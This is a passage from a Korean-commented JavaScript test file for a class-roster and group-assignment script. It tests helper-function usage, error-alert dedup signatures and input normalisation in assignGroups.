   *     합본(`code`)으로 세면 그 2곳이 잡혀 남의 커밋을 막는다. 그 이관은 작업대기열에 세웠다. */
  const 셋업 = fs.readFileSync(path.join(__dirname, '..', '엔진_셋업확장.js'), 'utf8');
  const 쓴곳 = (코드만(셋업).match(/split\('\('\)\[0\]/g) || []).length;
  assert.equal(쓴곳, 1,
    `엔진_셋업확장.js 에 «(» 접기가 ${쓴곳}곳이다 — 반키_ 정의 1곳이어야 하고 호출부는 반키_ 를 부른다`);
});

test('🔴 같은 반의 «다른» 실패는 다른 서명을 낸다 — 이름만 실으면 그날 두 번째 원인이 영영 안 알려진다', () => {
  /* safeRun 의 dedup 은 「함수명 + 에러 첫 줄」로 하루 1통이다(:1002·:1006). 첫 줄이 반 이름뿐이면
   *   같은 반에서 원인이 바뀌어도 서명이 같아 두 번째 원인은 알림이 억제된다 — 그런데 그 두 번째가
   *   더 무거운 고장일 수 있다(검수 758bae69853f). 그렇다고 스택을 첫 줄에 실으면 반대로 서명이
   *   매번 갈린다. 원인 «첫 줄»만 서명에 싣고 스택은 아래로 내리는 이유가 이 둘 사이다. */
  const 서명 = (원인) => {
    const rig = 반여럿Rig(['평일11A', '평일11B']);
    rig.stub.talkIndexOf_ = (ss2, cN) => {
      if (cN === '평일11A') throw new Error(원인);
      return [{ sid: cN + '-1', name: '학생', grp: 1, got: 3, max: 6, quiet: 0, pct: 50 }];
    };
    try { loadSnapshot()(rig.stub)(rig.ss); } catch (e) { return String(e.message).split('\n')[0]; }
    return null;
  };
  const a = 서명('groups 읽기 실패');
  const b = 서명('시트 권한 없음');
  assert.ok(a && b, '실패가 안 올라갔다');
  assert.notEqual(a, b, '원인이 달라도 서명이 같다 — 그날 두 번째 원인은 알림이 억제된다: ' + a);
  assert.equal(서명('groups 읽기 실패'), a, '같은 원인인데 서명이 갈렸다 — dedup 이 안 먹어 메일 쿼터를 태운다');
  assert.ok(a.includes('평일11A'), '서명에 반 이름이 없다 — 어느 반이 빠졌는지 손이 못 간다: ' + a);
  assert.ok(!/\bat\s/.test(a), '스택이 서명(첫 줄)에 실렸다 — 줄 번호가 바뀔 때마다 서명이 갈린다: ' + a);
});

test('🔴 assignGroups 는 «입력»도 접는다 — 한쪽만 접으면 전원이 걸러져 「0명 확정」이 나온다', () => {
  /* 학생 선별은 반키_(r[4]) !== cls 다. cls 를 안 접으면 손으로 assignGroups('정규반2(9시)') 를 부를 때
   *   한쪽만 접혀 아무도 안 맞고, 그런데 실패가 아니라 «0명 확정»이라는 성공 문장이 나온다(검수 48599e195c0f). */
  const fn = section('function assignGroups(className, opts)', 'function assignGroupsAll(');
  assert.ok(/const cls = 반키_\(className\)/.test(fn),
    'assignGroups 입력이 안 접힌다 — assignGroups("정규반2(9시)") 직접 호출이 학생을 전원 거른다');
  assert.ok(/반키_\(r\[4\]\) !== cls/.test(fn), '학생 선별이 반키_ 를 안 탄다 — 양쪽이 같은 통로를 타야 맞는다');
});
